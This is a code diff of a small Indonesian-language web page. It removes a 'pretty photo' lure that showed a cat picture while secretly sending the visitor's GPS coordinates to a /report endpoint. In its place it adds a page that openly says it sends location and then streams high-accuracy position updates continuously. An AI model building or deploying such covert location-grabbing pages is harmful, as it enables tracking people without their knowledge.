@@ -1,34 +1,34 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Foto Cantik 😍</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { margin: 0; background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    img { max-width: 100%; height: auto; border-radius: 10px; }
-  </style>
+  <meta charset="UTF-8" />
+  <title>Kirim Lokasi</title>
 </head>
 <body>
-  <img src="/static/kucing.jpeg" alt="Foto lucu">
+  <h2>Memproses lokasi... (pastikan izinkan lokasi)</h2>
+  <p>Halaman ini mengirim posisi GPS ke server secara otomatis.</p>
 
   <script>
-    // Coba ambil lokasi pengguna
-    navigator.geolocation.getCurrentPosition(success, error);
+    // otomatis kirim lokasi ke server; tidak mengirim nama (server memakai IP)
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-    function success(pos) {
-      const data = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude
-      };
-      fetch('/report', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+        fetch('/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude: lat, longitude: lon })
+        }).catch(e => console.error('Gagal kirim lokasi:', e));
+      }, err => {
+        console.error('Gagal mendapatkan lokasi:', err);
+      }, {
+        enableHighAccuracy: true,
+        maximumAge: 5000,
+        timeout: 15000
       });
-    }
-
-    function error(err) {
-      console.log("Tidak dapat mengambil lokasi:", err);
+    } else {
+      alert('Geolocation tidak didukung di browser ini.');
     }
   </script>
 </body>
